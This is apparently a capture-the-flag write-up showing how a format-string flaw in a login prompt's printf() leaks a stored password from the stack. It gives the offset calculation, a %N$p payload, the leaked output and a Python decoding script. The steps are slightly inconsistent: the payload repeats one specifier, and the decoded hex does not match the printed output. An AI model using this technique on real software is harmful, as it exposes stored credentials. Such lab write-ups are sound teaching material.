# Level02

This program has a username and password prompt using `fgets()`. After disassembling we can see that before these prompts occur the process opens and saves the contents of `/home/users/level03/.pass` to a buffer on the stack and does nothing with it.		

Additionally, the contents of the username prompt are displayed on screen with an unprotected `printf()`!		
This means that if we include `%p` or `%x` modifiers with `x$` parameter specifiers we can print anything up on the stack, including the copy of the flag (as we are in a 64bit binary, every increase in the `x$` specifier will read 8 bytes higher on the stack).		

The buffer we want to print is at `RBP - 0xa0`	; 160		
The size of the stack frame is `0x120`		; 288		

Parameter offset to reach our buffer = (288 - 160) / 8 + 1 = 22		

The length of the flag string is 40 so we will want to print 5 * 8.		

```bash
./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p%23$p%24$p%25$p%25$p
--[ Password:
*****************************************
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x354a35686e475873 does not have access!
```

Now all that is left to do is convert the printed memory into a readable string!		
- Remove the `0x`		
- split into 5 blocks		
- Convert to ASCII		
- Revert endian		

We can do this easily with a python script:
```python
import sys

str = '0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d'

for part in str.split('0x'):
    sys.stdout.write(part.decode('hex')[::-1])
print
```

```bash
python2 decode.py
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
